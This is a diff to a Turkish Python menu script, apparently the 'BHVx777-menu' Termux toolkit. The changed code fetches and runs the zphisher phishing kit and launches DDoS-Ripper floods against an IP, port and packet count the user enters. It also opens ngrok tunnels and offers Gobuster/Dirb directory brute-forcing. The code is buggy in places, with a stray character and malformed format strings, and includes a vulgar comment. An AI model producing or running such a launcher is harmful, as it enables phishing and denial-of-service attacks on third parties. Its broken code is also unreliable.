@@ -98,21 +98,47 @@ while True:
 	menu()
 	secim = input(f"{SARI}Seçminiz:    {RESET}")
 	if secim == "1":
-		os.system("clear")
-		f = pyfiglet.figlet_format("NGROK")
-		print(f"{MAVI}{f}{RESET}")
-		s = input(f"{SARI}Hangi port ile tünel açılacak:    {RESET}")
-		os.system("clear")
-		tunel = f"{CYAN}Tünel oluşturuluyor...{RESET}"
-		for karakter in tunel:
-		    sys.stdout.write(karakter)
-		    sys.stdout.flush()
-		    time.sleep(0.05)
-		time.sleep(3)
-		os.system("clear")
-		os.system(f"ngrok http {s}")
-		input(f"{SARI}Devam etmek için Enter'a tıklayın{RESET}")
-		os.system("clear")
+		NgrokVarmiYokmuSorusu = input(f"{SARI}Sizde Ngrok varmı{RESET}[{YESIL}Y{RESET}/{KIRMIZI}N{RESET}]:  ")
+		if NgrokVarmiYokmuSorusu == "y":
+			os.system("clear")
+			f = pyfiglet.figlet_format("NGROK")
+			print(f"{MAVI}{f}{RESET}")
+			s = input(f"{SARI}Hangi port ile tünel açılacak:    {RESET}")
+			os.system("clear")
+			tunel = f"{CYAN}Tünel oluşturuluyor...{RESET}"
+			for karakter in tunel:
+			    sys.stdout.write(karakter)
+			    sys.stdout.flush()
+			    time.sleep(0.05)
+			time.sleep(3)
+			os.system("clear")
+			os.system(f"ngrok http {s}")
+			input(f"{SARI}Devam etmek için Enter'a tıklayın{RESET}")
+			os.system("clear")
+		elif NgrokVarmiYokmuSorusu == "Y":
+			os.system("clear")
+			f2 = pyfiglet.figlet_format("NGROK")
+			print(f"{MAVI}{f2}{RESET}")
+			s2 = input(f"{SARI}Hangi port ile tünel açılacak:    {RESET}")
+			os.system("clear")
+			tunel2 = f"{CYAN}Tünel oluşturuluyor...{RESET}"
+			for karakter in tunel:
+			    sys.stdout.write(karakter)
+			    sys.stdout.flush()
+			    time.sleep(0.05)
+			time.sleep(3)
+			os.system("clear")
+			os.system(f"ngrok http {s}")
+			input(f"{SARI}Devam etmek için Enter'a tıklayın{RESET}")
+			os.system("clear")
+		elif NgrokVarmiYokmuSorusu == "n":
+			print(f"{YESIL}OZAMAN YÜKLE!{RESET}")
+			time.sleep(3)
+			os.system("clear")
+		elif NgrokVarmiYokmuSorusu == "N":
+			print(f"{YESIL}OZAMAN YÜKLE!{RESET}")
+			time.sleep(3)
+			os.system("clear")
 	elif secim == "2":
 		os.system("clear")
 		aapt = pyfiglet.figlet_format("APK PERMISSIONS")
@@ -135,50 +161,110 @@ while True:
 		zf = pyfiglet.figlet_format("ZPHISHER")
 		print(f"{MAVI}zf{RESET}")
 		os.system("clear")
-		sec = input(f"{SARI}Sizde Zphisher adlı Tool varmı{RESET}{MAVI}[Y/N]{RESET}:	")
+		sec = input(f"{SARI}Sizde Zphisher adlı Tool varmı{RESET}[{YESIL}Y{RESET}/{KIRMIZI}N{RESET}]:	")
 		os.system("clear")
 		if sec == "y":
-			zph = os.path.expanduser("~/zphisher/")
+			zph = os.path.expanduser("~/BHVx777-menu/zphisher")
 			os.chdir(zph)
+			os.system("bash zphisher.sh")
+			os.system("clear")
+		elif sec == "Y":
+			zph2 = os.path.expanduser("~/BHVx777-menu")
+			os.chdir(zph2)
 			os.system("bash zphisher.sh")
 			os.system("clear")
 		elif sec == "n":
 			zs = input(f"{SARI}Zphisher Tool'u yüklensinmi{RESET}{MAVI}[Y/N]{RESET}:	")
 			if zs == "y":
+				zphisherYuklemeYoluKucukY = os.path.expanduser("~/BHVx777-menu")
+				os.chdir(zphisherYuklemeYoluKucukY)
 				os.system("pkg install git")
 				os.system("git clone https://github.com/htr-tech/zphisher")
 				os.system("cd zphisher")
-				os.system("bash zphisher.sh")
+				print(f"{YESIL}Succesfuly{RESET}")
+				time.sleep(3.4)
+				input(f"{SARI}Devam etmek için enter'a tıklayın{RESET}")
+				os.system("clear")
+			elif zs == "Y":
+				zphisherYuklemeYoluBuyukY = os.path.expanduser("~/BHVx777-menu")
+				os.chdir(zphisherYuklemeYoluBuyukY)
+				os.system("pkg install git")
+				os.system("git clone https://github.com/htr-tech/zphisher")
+				os.system("cd zphisher")
+				print(f"{YESIL}Succesfuly{RESET}")
+				time.sleep(3.4)
+				input(f"{SARI}Devam etmek için enter'a tıklayın{RESET}")
 				os.system("clear")
 			elif zs == "n":
+				os.system("clear")
+			elif zs == "N":
+				os.system("clear")
+		elif sec == "N":
+			zs2 = input(f"{SARI}Zphisher Tool'u yüklensinmi{RESET}{MAVI}[Y/N]{RESET}:        ")
+			if zs2 == "y":
+				zphisherYuklemeYoluIkinciKucukY = os.path.expanduser("~/BHVx777-menu")
+				os.chdir(zphisherYuklemeYoluIkinciKucukY)
+				os.system("pkg install git")
+				os.system("git clone https://github.com/htr-tech/zphisher")
+				os.system("cd zphisher")
+				print(f"{YESIL}Succesfuly{RESET}")
+				time.sleep(3.4)
+				input(f"{SARI}Devam etmek için enter'a tıklayın{RESET}")
+			elif zs2 == "Y":
+				zphisherYuklemeYoluIkinciBuyukY = os.path.expanduser("~/BHVx777-menu")
+				os.chdir(zphisherYuklemeYoluIkinciBuyukY)
+				os.system("pkg install git")
+				os.system("git clone https://github.com/htr-tech/zphisher")
+				os.system("cd zphisher")
+				print(f"{YESIL}Succesfuly{RESET}")
+				time.sleep(3.4)
+				input(f"{SARI}Devam etmek için enter'a tıklayın{RESET}")
+				os.system("clear")
+			elif zs2 == "n":
+				os.system("clear")
+			elif zs2 == "N":
 				os.system("clear")
 	elif secim == "4":
 		os.system("clear")
 		df = pyfiglet.figlet_format("DDOS")
 		print(f"{MAVI}{df}{RESET}")
-		dds = input(f"{SARI}Sizde {RESET}{MOR}DDoS-Ripper{RESET} {SARI}adlı tool varmı{RESET} {MAVI}[Y/N]{RESET}:    ")
+		dds = input(f"{SARI}Sizde {RESET}{MOR}DDoS-Ripper{RESET} {SARI}adlı tool varmı{RESET} {MAVI}[Y/N]{RESET}(Küçük y veya küçük n kullan:    ")
+		# sorun bende değil hem tool'umu sanki 150 kişi kullanıyor küçük karakterler burda küçük harfler kullanıyorlar diye kuduranların amina kyim
 		if dds == "y":
 			dsi = input(f"{SARI}ddos atmak istediğiniz IP adresini girin{RESET}:    ")
 			dpst = input(f"{SARI}ddos atmak istediğiniz sitenin aynı anda kaç paket göndersin {RESET}{CYAN}[135 ila 443 arasından seçin]:    {RESET}")
 			dps = input(f"{SARI}ddos atmak istediğiniz sitenin açık port'unu biliyormusunuz{RESET}{MAVI}[Y/N]{RESET}:    ")
 			if dps == "y":
-				dy = os.path.expanduser("~/DDoS-Ripper/")
+				dy = os.path.expanduser("~/BHVx777-menu/DDoS-Ripper")
+				os.chdir(dy)
+				dsp = input(f"{SARI}Sitenin açık port'unu girin{RESET}:    ")
+				os.system(f"python3 DRipper.py -s {dsi} -p {dsp} -t {dpst}")
+				input(f"{KIRMIZI}DDOS{RESET} {CYAN}saldırısı bitmiştir devam etmek için enter'a tıklayın{RESET}")P
+				os.system("clear")
+			elif dps == "Y":
+				dy2 = os.path.expanduser("~/BHVx777-menu/DDoS-Ripper")
 				os.chdir(dy)
 				dsp = input(f"{SARI}Sitenin açık port'unu girin{RESET}:    ")
 				os.system(f"python3 DRipper.py -s {dsi} -p {dsp} -t {dpst}")
 				input(f"{KIRMIZI}DDOS{RESET} {CYAN}saldırısı bitmiştir devam etmek için enter'a tıklayın{RESET}")
 				os.system("clear")
 			elif dps == "n":
-				dys = os.path.expanduser("~/DDoS-Ripper/")
-				os.chdir(dys)
+				dy3 = os.path.expanduser("~/BHVx777-menu/DDoS-Ripper")
+				os.chdir(dy3)
 				os.system("python3 DRipper.py -s {dsi} -t {dpst")
+				input(f"{KIRMIZI}DDOS{RESET} {CYAN}saldırısı bitmiştir devam etmek için enter'a tıklayın{RESET}")
+				os.system("clear")
+			elif dps == "N":
+				dy4 = os.path.expanduser("~/BHVx777-menu/DDoS-Ripper")
+				os.chdir(dy4)
+				os.system("python3 DRipper.py -s {dsi} -t {dpst}")
 				input(f"{KIRMIZI}DDOS{RESET} {CYAN}saldırısı bitmiştir devam etmek için enter'a tıklayın{RESET}")
 				os.system("clear")
 		elif dds == "n":
 			dty = pyfiglet.figlet_format("INSTALLING")
 			print(f"{MAVI}{dty}{RESET}")
 			os.system("pkg install git -y && pkg install python3 && git clone https://github.com/palahsu/DDoS-Ripper.git && cd DDoS-Ripper")
-			input(f"{MOR}DDoS-Ripper{RESET} {CYAN}adlı tool BHVx777 klasörüne yüklendi devam etmek için enter'a tıklayın{RESET}")
+			input(f"{MOR}DDoS-Ripper{RESET} {CYAN}adlı tool Genel klasörüne yüklendi devam etmek için enter'a tıklayın{RESET}")
 			os.system("clear")
 	elif secim == "5":
 		os.system("clear")
@@ -186,10 +272,10 @@ while True:
 		print(f"{MAVI}{gd}{RESET}")
 		print(f"{CYAN}Başlarındaki sayı ile belirtin{RESET}")
 		print(f"{KIRMIZI}▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪{RESET}")
-		print(f"{KIRMIZI}[1]{RESET}	{CYAN}Gobuster{RESET}") #istediğin txt deneyebilirsin gelişmiş
+		print(f"{KIRMIZI}[1]{RESET}	{CYAN}Gobuster{RESET}") #istediğin txt deneyebilirsin
 		print(f"{KIRMIZI}[2]{RESET}	{CYAN}Dirb{RESET}") #Eski ve özel bir txt kullanılamaz
 		print(f"{KIRMIZI}▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪{RESET}\n")
-		gdn = f"{MOR}Not{RESET}: {CYAN}Gobuster'de kendi txt kullanabiliyorsun{RESET}\n\n"
+		gdn = f"{MOR}Not{RESET}: {CYAN}Gobuster'de kendi txt'ini kullanabiliyorsun{RESET}\n\n"
 		for ndg in gdn:
 		    sys.stdout.write(ndg)
 		    sys.stdout.flush()
@@ -268,7 +354,7 @@ while True:
 		os.system("rm -rf BHVx777-menu")
 		os.system("git clone https://github.com/bhv-777/BHVx777-menu.git")
 		os.execv(sys.executable, [sys.executable, os.path.join(GY, "BHVx777-menu", "bhv.py")])
-		print(f"{YESIL}Succes{RESET}")
+		print(f"{YESIL}Succesfuly{RESET}")
 		time.sleep(2.4)
 		os.system("clear")
 
